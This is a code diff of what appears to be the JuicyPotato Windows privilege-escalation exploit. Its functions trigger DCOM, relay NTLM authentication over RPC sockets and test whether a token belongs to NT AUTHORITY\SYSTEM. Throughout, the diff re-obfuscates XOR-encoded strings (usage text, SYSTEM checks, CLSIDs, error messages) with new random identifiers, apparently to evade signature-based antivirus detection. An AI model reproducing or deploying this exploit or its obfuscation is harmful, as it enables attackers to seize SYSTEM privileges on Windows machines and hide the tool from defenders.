@@ -42,16 +42,16 @@ wchar_t *processname = NULL;
 int IsTokenSystem(HANDLE tok)
 {
 	
-	 char  hid__S__S__zotuWHhr2OYl[] = {'\x60','\x16','\x7e','\x60','\x16','\x19','\x60','\x16','\x4f','\x45'};
-char k_MzrXW1lV7u2Q = '\x45';
-for(char &x : hid__S__S__zotuWHhr2OYl){
-x = x ^ k_MzrXW1lV7u2Q;
+	 char  hid__S__S__j3UGYCAIPy0Y[] = {'\x60','\x16','\x7e','\x60','\x16','\x19','\x60','\x16','\x4f','\x45'};
+ char  k_liq1J9fjWL8G = '\x45';
+for( char  &x : hid__S__S__j3UGYCAIPy0Y){
+x = x ^ k_liq1J9fjWL8G;
 }
 
-	 wchar_t  hid_S_Y_S__WBvTJpt3dnQL[] = {'\x16','\x45','\x1c','\x45','\x16','\x45','\x11','\x45','\x0','\x45','\x8','\x45','\x45'};
-char k_G9rD0s9uyFNe = '\x45';
-for(char &x : hid_S_Y_S__WBvTJpt3dnQL){
-x = x ^ k_G9rD0s9uyFNe;
+	 wchar_t  hid_S_Y_S__763KZvTIL8RX[] = {'\x16','\x1c','\x16','\x11','\x0','\x8','\x45'};
+ wchar_t  k_3ZKh3c6N0bXH = '\x45';
+for( wchar_t  &x : hid_S_Y_S__763KZvTIL8RX){
+x = x ^ k_3ZKh3c6N0bXH;
 }
 DWORD Size, UserSize, DomainSize;
 	SID *sid;
@@ -78,8 +78,8 @@ DWORD Size, UserSize, DomainSize;
 	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
 	free(sid);
 
-	printf(hid__S__S__zotuWHhr2OYl, olestr, DomainName, UserName);
-	if (!_wcsicmp(UserName, hid_S_Y_S__WBvTJpt3dnQL))
+	printf(hid__S__S__j3UGYCAIPy0Y, olestr, DomainName, UserName);
+	if (!_wcsicmp(UserName, hid_S_Y_S__763KZvTIL8RX))
 		return 1;
 
 	return 0;
@@ -88,30 +88,30 @@ DWORD Size, UserSize, DomainSize;
 void usage()
 {
 	
-	 char  hid_JuicyP_mCO0klnbT6cR[] = {'\xf','\x30','\x2c','\x26','\x3c','\x15','\x2a','\x31','\x24','\x31','\x2a','\x65','\x33','\x60','\x36','\x65','\x4f','\x4f','\x45'};
-char k_imGwG6rtJlza = '\x45';
-for(char &x : hid_JuicyP_mCO0klnbT6cR){
-x = x ^ k_imGwG6rtJlza;
+	 char  hid_JuicyP_tFSrHY91AOJi[] = {'\xf','\x30','\x2c','\x26','\x3c','\x15','\x2a','\x31','\x24','\x31','\x2a','\x65','\x33','\x60','\x36','\x65','\x4f','\x4f','\x45'};
+ char  k_LiyI4pERMogi = '\x45';
+for( char  &x : hid_JuicyP_tFSrHY91AOJi){
+x = x ^ k_LiyI4pERMogi;
 }
 
-	 char  hid_Mandat_FnlSnu9LIGP2[] = {'\x8','\x24','\x2b','\x21','\x24','\x31','\x2a','\x37','\x3c','\x65','\x24','\x37','\x22','\x36','\x7f','\x65','\x4f','\x68','\x31','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x35','\x37','\x2a','\x26','\x20','\x36','\x36','\x65','\x26','\x24','\x29','\x29','\x7f','\x65','\x79','\x31','\x7b','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x69','\x65','\x79','\x30','\x7b','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x69','\x65','\x79','\x6f','\x7b','\x65','\x31','\x37','\x3c','\x65','\x27','\x2a','\x31','\x2d','\x4f','\x68','\x35','\x65','\x79','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x7b','\x7f','\x65','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x65','\x31','\x2a','\x65','\x29','\x24','\x30','\x2b','\x26','\x2d','\x4f','\x68','\x29','\x65','\x79','\x35','\x2a','\x37','\x31','\x7b','\x7f','\x65','\x6','\xa','\x8','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x35','\x2a','\x37','\x31','\x4f','\x45'};
-char k_uxPzE0oMZZy1 = '\x45';
-for(char &x : hid_Mandat_FnlSnu9LIGP2){
-x = x ^ k_uxPzE0oMZZy1;
+	 char  hid_Mandat_xL2SEwxgbf5s[] = {'\x8','\x24','\x2b','\x21','\x24','\x31','\x2a','\x37','\x3c','\x65','\x24','\x37','\x22','\x36','\x7f','\x65','\x4f','\x68','\x31','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x35','\x37','\x2a','\x26','\x20','\x36','\x36','\x65','\x26','\x24','\x29','\x29','\x7f','\x65','\x79','\x31','\x7b','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x69','\x65','\x79','\x30','\x7b','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x69','\x65','\x79','\x6f','\x7b','\x65','\x31','\x37','\x3c','\x65','\x27','\x2a','\x31','\x2d','\x4f','\x68','\x35','\x65','\x79','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x7b','\x7f','\x65','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x65','\x31','\x2a','\x65','\x29','\x24','\x30','\x2b','\x26','\x2d','\x4f','\x68','\x29','\x65','\x79','\x35','\x2a','\x37','\x31','\x7b','\x7f','\x65','\x6','\xa','\x8','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x35','\x2a','\x37','\x31','\x4f','\x45'};
+ char  k_Vcoi6d5BmyWs = '\x45';
+for( char  &x : hid_Mandat_xL2SEwxgbf5s){
+x = x ^ k_Vcoi6d5BmyWs;
 }
 
-	 char  hid_Option_KX39e2ehz2nw[] = {'\xa','\x35','\x31','\x2c','\x2a','\x2b','\x24','\x29','\x65','\x24','\x37','\x22','\x36','\x7f','\x65','\x4f','\x68','\x28','\x65','\x79','\x2c','\x35','\x7b','\x7f','\x65','\x6','\xa','\x8','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x24','\x21','\x21','\x37','\x20','\x36','\x36','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x6c','\x4f','\x68','\x24','\x65','\x79','\x24','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x7b','\x7f','\x65','\x26','\x2a','\x28','\x28','\x24','\x2b','\x21','\x65','\x29','\x2c','\x2b','\x20','\x65','\x24','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x65','\x31','\x2a','\x65','\x35','\x24','\x36','\x36','\x65','\x31','\x2a','\x65','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\xb','\x10','\x9','\x9','\x6c','\x4f','\x68','\x2e','\x65','\x79','\x2c','\x35','\x7b','\x7f','\x65','\x17','\x15','\x6','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x2c','\x35','\x65','\x24','\x21','\x21','\x37','\x20','\x36','\x36','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x6c','\x4f','\x68','\x2b','\x65','\x79','\x35','\x2a','\x37','\x31','\x7b','\x7f','\x65','\x17','\x15','\x6','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x35','\x2a','\x37','\x31','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x76','\x70','\x6c','\x4f','\x68','\x26','\x65','\x79','\x3e','\x26','\x29','\x36','\x2c','\x21','\x38','\x7b','\x7f','\x65','\x6','\x9','\x16','\xc','\x1','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x7','\xc','\x11','\x16','\x7f','\x3e','\x71','\x7c','\x7c','\x74','\x21','\x76','\x71','\x27','\x68','\x7d','\x75','\x24','\x74','\x68','\x71','\x77','\x7c','\x74','\x68','\x7d','\x76','\x27','\x73','\x68','\x76','\x76','\x77','\x7d','\x76','\x73','\x73','\x27','\x7c','\x75','\x7c','\x72','\x38','\x6c','\x4f','\x68','\x3f','\x65','\x2a','\x2b','\x29','\x3c','\x65','\x31','\x20','\x36','\x31','\x65','\x6','\x9','\x16','\xc','\x1','\x65','\x24','\x2b','\x21','\x65','\x35','\x37','\x2c','\x2b','\x31','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x62','\x36','\x65','\x30','\x36','\x20','\x37','\x4f','\x45'};
-char k_9RBlgKOsCMiM = '\x45';
-for(char &x : hid_Option_KX39e2ehz2nw){
-x = x ^ k_9RBlgKOsCMiM;
+	 char  hid_Option_Muga0tMAjJmg[] = {'\xa','\x35','\x31','\x2c','\x2a','\x2b','\x24','\x29','\x65','\x24','\x37','\x22','\x36','\x7f','\x65','\x4f','\x68','\x28','\x65','\x79','\x2c','\x35','\x7b','\x7f','\x65','\x6','\xa','\x8','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x24','\x21','\x21','\x37','\x20','\x36','\x36','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x6c','\x4f','\x68','\x24','\x65','\x79','\x24','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x7b','\x7f','\x65','\x26','\x2a','\x28','\x28','\x24','\x2b','\x21','\x65','\x29','\x2c','\x2b','\x20','\x65','\x24','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x65','\x31','\x2a','\x65','\x35','\x24','\x36','\x36','\x65','\x31','\x2a','\x65','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\xb','\x10','\x9','\x9','\x6c','\x4f','\x68','\x2e','\x65','\x79','\x2c','\x35','\x7b','\x7f','\x65','\x17','\x15','\x6','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x2c','\x35','\x65','\x24','\x21','\x21','\x37','\x20','\x36','\x36','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x6c','\x4f','\x68','\x2b','\x65','\x79','\x35','\x2a','\x37','\x31','\x7b','\x7f','\x65','\x17','\x15','\x6','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x35','\x2a','\x37','\x31','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x76','\x70','\x6c','\x4f','\x68','\x26','\x65','\x79','\x3e','\x26','\x29','\x36','\x2c','\x21','\x38','\x7b','\x7f','\x65','\x6','\x9','\x16','\xc','\x1','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x7','\xc','\x11','\x16','\x7f','\x3e','\x71','\x7c','\x7c','\x74','\x21','\x76','\x71','\x27','\x68','\x7d','\x75','\x24','\x74','\x68','\x71','\x77','\x7c','\x74','\x68','\x7d','\x76','\x27','\x73','\x68','\x76','\x76','\x77','\x7d','\x76','\x73','\x73','\x27','\x7c','\x75','\x7c','\x72','\x38','\x6c','\x4f','\x68','\x3f','\x65','\x2a','\x2b','\x29','\x3c','\x65','\x31','\x20','\x36','\x31','\x65','\x6','\x9','\x16','\xc','\x1','\x65','\x24','\x2b','\x21','\x65','\x35','\x37','\x2c','\x2b','\x31','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x62','\x36','\x65','\x30','\x36','\x20','\x37','\x4f','\x45'};
+ char  k_vmLTTLcaiMMZ = '\x45';
+for( char  &x : hid_Option_Muga0tMAjJmg){
+x = x ^ k_vmLTTLcaiMMZ;
 }
-printf(hid_JuicyP_mCO0klnbT6cR, VERSION);
+printf(hid_JuicyP_tFSrHY91AOJi, VERSION);
 
-	printf(hid_Mandat_FnlSnu9LIGP2
+	printf(hid_Mandat_xL2SEwxgbf5s
 	);
 
 	printf("\n\n");
-	printf(hid_Option_KX39e2ehz2nw
+	printf(hid_Option_Muga0tMAjJmg
 	);
 }
 
@@ -167,10 +167,10 @@ int PotatoAPI::findNTLMBytes(char *bytes, int len) {
 
 int PotatoAPI::processNtlmBytes(char *bytes, int len) {
 	
-	 char  hid_Error__tQFr1yScvxbV[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x68','\x65','\x10','\x2b','\x2e','\x2b','\x2a','\x32','\x2b','\x65','\xb','\x11','\x9','\x8','\x65','\x28','\x20','\x36','\x36','\x24','\x22','\x20','\x65','\x31','\x3c','\x35','\x20','\x6b','\x6b','\x6b','\x45'};
-char k_4ptMxpMwcqMI = '\x45';
-for(char &x : hid_Error__tQFr1yScvxbV){
-x = x ^ k_4ptMxpMwcqMI;
+	 char  hid_Error__NHCPqV8XoUIw[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x68','\x65','\x10','\x2b','\x2e','\x2b','\x2a','\x32','\x2b','\x65','\xb','\x11','\x9','\x8','\x65','\x28','\x20','\x36','\x36','\x24','\x22','\x20','\x65','\x31','\x3c','\x35','\x20','\x6b','\x6b','\x6b','\x45'};
+ char  k_PuCOJQ5ZqH4y = '\x45';
+for( char  &x : hid_Error__NHCPqV8XoUIw){
+x = x ^ k_PuCOJQ5ZqH4y;
 }
 int ntlmLoc = findNTLMBytes(bytes, len);
 	if (ntlmLoc == -1) return -1;
@@ -190,7 +190,7 @@ int ntlmLoc = findNTLMBytes(bytes, len);
 			negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
 			break;
 		default:
-			printf(hid_Error__tQFr1yScvxbV);
+			printf(hid_Error__NHCPqV8XoUIw);
 			return -1;
 			break;
 	}
@@ -214,10 +214,10 @@ int checkForNewConnection(SOCKET* ListenSocket, SOCKET* ClientSocket) {
 int PotatoAPI::triggerDCOM(void)
 {
 	
-	 wchar_t  hid________JbgohlUbZbNh[] = {'\x3e','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x68','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x68','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x68','\x45','\x6','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x68','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x75','\x45','\x71','\x45','\x73','\x45','\x38','\x45','\x45'};
-char k_paiFM459JKa5 = '\x45';
-for(char &x : hid________JbgohlUbZbNh){
-x = x ^ k_paiFM459JKa5;
+	 wchar_t  hid________WGIQuCDlvl3J[] = {'\x3e','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x68','\x6','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x71','\x73','\x38','\x45'};
+ wchar_t  k_QpqQjQ369fb0 = '\x45';
+for( wchar_t  &x : hid________WGIQuCDlvl3J){
+x = x ^ k_QpqQjQ369fb0;
 }
 CoInitialize(nullptr);
 
@@ -236,7 +236,7 @@ CoInitialize(nullptr);
 	CLSIDFromString(olestr, &clsid);
 	CLSID tmp;
 	//IUnknown IID
-	CLSIDFromString(hid________JbgohlUbZbNh, &tmp);
+	CLSIDFromString(hid________WGIQuCDlvl3J, &tmp);
 	MULTI_QI qis[1];
 	qis[0].pIID = &tmp;
 	qis[0].pItf = NULL;
@@ -251,52 +251,52 @@ CoInitialize(nullptr);
 
 int PotatoAPI::startRPCConnection(void) {
 	
-	 char  hid_WSASta_lB1JI6RpK8bn[] = {'\x12','\x16','\x4','\x16','\x31','\x24','\x37','\x31','\x30','\x35','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_rZ5TVBfV8tvj = '\x45';
-for(char &x : hid_WSASta_lB1JI6RpK8bn){
-x = x ^ k_rZ5TVBfV8tvj;
+	 char  hid_WSASta_jaLPWCwZyBbp[] = {'\x12','\x16','\x4','\x16','\x31','\x24','\x37','\x31','\x30','\x35','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_apThNp2QOhiB = '\x45';
+for( char  &x : hid_WSASta_jaLPWCwZyBbp){
+x = x ^ k_apThNp2QOhiB;
 }
 
-	 char  hid________Gz5FNiyKPYtp[] = {'\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x45'};
-char k_nyumvrYPfLzi = '\x45';
-for(char &x : hid________Gz5FNiyKPYtp){
-x = x ^ k_nyumvrYPfLzi;
+	 char  hid________CgOefsJPL1yI[] = {'\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x45'};
+ char  k_O0eylOZm1QDc = '\x45';
+for( char  &x : hid________CgOefsJPL1yI){
+x = x ^ k_O0eylOZm1QDc;
 }
 
-	 char  hid_getadd_wWTdwOgxnAr4[] = {'\x22','\x20','\x31','\x24','\x21','\x21','\x37','\x2c','\x2b','\x23','\x2a','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_uNWD0M9LK3u9 = '\x45';
-for(char &x : hid_getadd_wWTdwOgxnAr4){
-x = x ^ k_uNWD0M9LK3u9;
+	 char  hid_getadd_1OVD114UtJuW[] = {'\x22','\x20','\x31','\x24','\x21','\x21','\x37','\x2c','\x2b','\x23','\x2a','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_lLOz9d2KgPqW = '\x45';
+for( char  &x : hid_getadd_1OVD114UtJuW){
+x = x ^ k_lLOz9d2KgPqW;
 }
 
-	 char  hid_socket_lP0D6eo0wVhi[] = {'\x36','\x2a','\x26','\x2e','\x20','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x29','\x21','\x4f','\x45'};
-char k_yB7RohrW2NLl = '\x45';
-for(char &x : hid_socket_lP0D6eo0wVhi){
-x = x ^ k_yB7RohrW2NLl;
+	 char  hid_socket_1BlcYO0khQbt[] = {'\x36','\x2a','\x26','\x2e','\x20','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x29','\x21','\x4f','\x45'};
+ char  k_zQsnVwrWyZ07 = '\x45';
+for( char  &x : hid_socket_1BlcYO0khQbt){
+x = x ^ k_zQsnVwrWyZ07;
 }
 
-	 char  hid_Unable_vMSBZYCANcTU[] = {'\x10','\x2b','\x24','\x27','\x29','\x20','\x65','\x31','\x2a','\x65','\x26','\x2a','\x2b','\x2b','\x20','\x26','\x31','\x65','\x31','\x2a','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x64','\x4f','\x45'};
-char k_3eQ5zQEDtIrr = '\x45';
-for(char &x : hid_Unable_vMSBZYCANcTU){
-x = x ^ k_3eQ5zQEDtIrr;
+	 char  hid_Unable_bmjXQWh8n26h[] = {'\x10','\x2b','\x24','\x27','\x29','\x20','\x65','\x31','\x2a','\x65','\x26','\x2a','\x2b','\x2b','\x20','\x26','\x31','\x65','\x31','\x2a','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x64','\x4f','\x45'};
+ char  k_sCv6jNP354hB = '\x45';
+for( char  &x : hid_Unable_bmjXQWh8n26h){
+x = x ^ k_sCv6jNP354hB;
 }
 
-	 char  hid_RPC____UWjpvwhah1lj[] = {'\x17','\x15','\x6','\x65','\x68','\x7b','\x65','\x36','\x20','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_ZXF7FLmwF5HL = '\x45';
-for(char &x : hid_RPC____UWjpvwhah1lj){
-x = x ^ k_ZXF7FLmwF5HL;
+	 char  hid_RPC____lej9ZwRa1MN5[] = {'\x17','\x15','\x6','\x65','\x68','\x7b','\x65','\x36','\x20','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_7BZ8fOg3LfQ7 = '\x45';
+for( char  &x : hid_RPC____lej9ZwRa1MN5){
+x = x ^ k_7BZ8fOg3LfQ7;
 }
 
-	 char  hid_RPC____WTFh17eXM6er[] = {'\x17','\x15','\x6','\x68','\x7b','\x65','\x6','\x2a','\x2b','\x2b','\x20','\x26','\x31','\x2c','\x2a','\x2b','\x65','\x26','\x29','\x2a','\x36','\x20','\x21','\x4f','\x45'};
-char k_K3CsUny0JuxF = '\x45';
-for(char &x : hid_RPC____WTFh17eXM6er){
-x = x ^ k_K3CsUny0JuxF;
+	 char  hid_RPC____WrMYCUAie0xS[] = {'\x17','\x15','\x6','\x68','\x7b','\x65','\x6','\x2a','\x2b','\x2b','\x20','\x26','\x31','\x2c','\x2a','\x2b','\x65','\x26','\x29','\x2a','\x36','\x20','\x21','\x4f','\x45'};
+ char  k_0vFAcqlwstvp = '\x45';
+for( char  &x : hid_RPC____WrMYCUAie0xS){
+x = x ^ k_0vFAcqlwstvp;
 }
 
-	 char  hid_RPC____tMmiDGxTZRoB[] = {'\x17','\x15','\x6','\x65','\x68','\x7b','\x65','\x37','\x20','\x26','\x33','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_rBvOoRtzqool = '\x45';
-for(char &x : hid_RPC____tMmiDGxTZRoB){
-x = x ^ k_rBvOoRtzqool;
+	 char  hid_RPC____KwjezwwbVSnq[] = {'\x17','\x15','\x6','\x65','\x68','\x7b','\x65','\x37','\x20','\x26','\x33','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_NfaurfXt3vXr = '\x45';
+for( char  &x : hid_RPC____KwjezwwbVSnq){
+x = x ^ k_NfaurfXt3vXr;
 }
 const int DEFAULT_BUFLEN = 4096;
 
@@ -315,7 +315,7 @@ const int DEFAULT_BUFLEN = 4096;
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 	if (iResult != 0) {
-		printf(hid_WSASta_lB1JI6RpK8bn, iResult);
+		printf(hid_WSASta_jaLPWCwZyBbp, iResult);
 		return 1;
 	}
 
@@ -333,7 +333,7 @@ const int DEFAULT_BUFLEN = 4096;
 		wcstombs(myhost, rpcserver, 24);
 	}
 	else {
-		strcpy(myhost, hid________Gz5FNiyKPYtp);
+		strcpy(myhost, hid________CgOefsJPL1yI);
 	}
 
 	if (rpcport != NULL) {
@@ -346,7 +346,7 @@ const int DEFAULT_BUFLEN = 4096;
 
 	iResult = getaddrinfo(myhost, myport, &hints, &result);
 	if (iResult != 0) {
-		printf(hid_getadd_wWTdwOgxnAr4, iResult);
+		printf(hid_getadd_1OVD114UtJuW, iResult);
 		WSACleanup();
 		return 1;
 	}
@@ -356,7 +356,7 @@ const int DEFAULT_BUFLEN = 4096;
 		// Create a SOCKET for connecting to server
 		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
 		if (ConnectSocket == INVALID_SOCKET) {
-			printf(hid_socket_lP0D6eo0wVhi, WSAGetLastError());
+			printf(hid_socket_1BlcYO0khQbt, WSAGetLastError());
 			WSACleanup();
 			return 1;
 		}
@@ -373,7 +373,7 @@ const int DEFAULT_BUFLEN = 4096;
 	}
 
 	if (ConnectSocket == INVALID_SOCKET) {
-		printf(hid_Unable_vMSBZYCANcTU);
+		printf(hid_Unable_bmjXQWh8n26h);
 		WSACleanup();
 		return 1;
 	}
@@ -396,7 +396,7 @@ const int DEFAULT_BUFLEN = 4096;
 
 		iResult = send(ConnectSocket, sendbuf, *len, 0);
 		if (iResult == SOCKET_ERROR) {
-			printf(hid_RPC____UWjpvwhah1lj, WSAGetLastError());
+			printf(hid_RPC____lej9ZwRa1MN5, WSAGetLastError());
 			closesocket(ConnectSocket);
 			WSACleanup();
 			return 0;
@@ -408,10 +408,10 @@ const int DEFAULT_BUFLEN = 4096;
 			comSendQ->push(recvbuf);
 		}
 		else if (iResult == 0) {
-			printf(hid_RPC____WTFh17eXM6er);
+			printf(hid_RPC____WrMYCUAie0xS);
 		}
 		else {
-			printf(hid_RPC____tMmiDGxTZRoB, WSAGetLastError());
+			printf(hid_RPC____KwjezwwbVSnq, WSAGetLastError());
 			return 0;
 		}
 
@@ -429,58 +429,58 @@ const int DEFAULT_BUFLEN = 4096;
 
 int PotatoAPI::startCOMListener(void) {
 	
-	 char  hid_WSASta_aENoHv6qzv1x[] = {'\x12','\x16','\x4','\x16','\x31','\x24','\x37','\x31','\x30','\x35','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_fxid60p2zrcT = '\x45';
-for(char &x : hid_WSASta_aENoHv6qzv1x){
-x = x ^ k_fxid60p2zrcT;
+	 char  hid_WSASta_uItENExTGaQa[] = {'\x12','\x16','\x4','\x16','\x31','\x24','\x37','\x31','\x30','\x35','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_K5Fy5Df1adRK = '\x45';
+for( char  &x : hid_WSASta_uItENExTGaQa){
+x = x ^ k_K5Fy5Df1adRK;
 }
 
-	 char  hid_getadd_VPm8BoJJl8V6[] = {'\x22','\x20','\x31','\x24','\x21','\x21','\x37','\x2c','\x2b','\x23','\x2a','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_EwuhsSqGbMKy = '\x45';
-for(char &x : hid_getadd_VPm8BoJJl8V6){
-x = x ^ k_EwuhsSqGbMKy;
+	 char  hid_getadd_WLGyGAeaJYOT[] = {'\x22','\x20','\x31','\x24','\x21','\x21','\x37','\x2c','\x2b','\x23','\x2a','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
+ char  k_fYIvGs6YjAIK = '\x45';
+for( char  &x : hid_getadd_WLGyGAeaJYOT){
+x = x ^ k_fYIvGs6YjAIK;
 }
 
-	 char  hid_socket_FlVFBRlQYHMt[] = {'\x36','\x2a','\x26','\x2e','\x20','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x29','\x21','\x4f','\x45'};
-char k_uoNSDjqTaq0e = '\x45';
-for(char &x : hid_socket_FlVFBRlQYHMt){
-x = x ^ k_uoNSDjqTaq0e;
+	 char  hid_socket_xNyt2V3FSaAZ[] = {'\x36','\x2a','\x26','\x2e','\x20','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x29','\x21','\x4f','\x45'};
+ char  k_505TbAlzsHA3 = '\x45';
+for( char  &x : hid_socket_xNyt2V3FSaAZ){
+x = x ^ k_505TbAlzsHA3;
 }
 
-	 char  hid_bind_f_iEeLVsXPiLME[] = {'\x27','\x2c','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
-char k_fqiCdX9it8OD = '\x45';
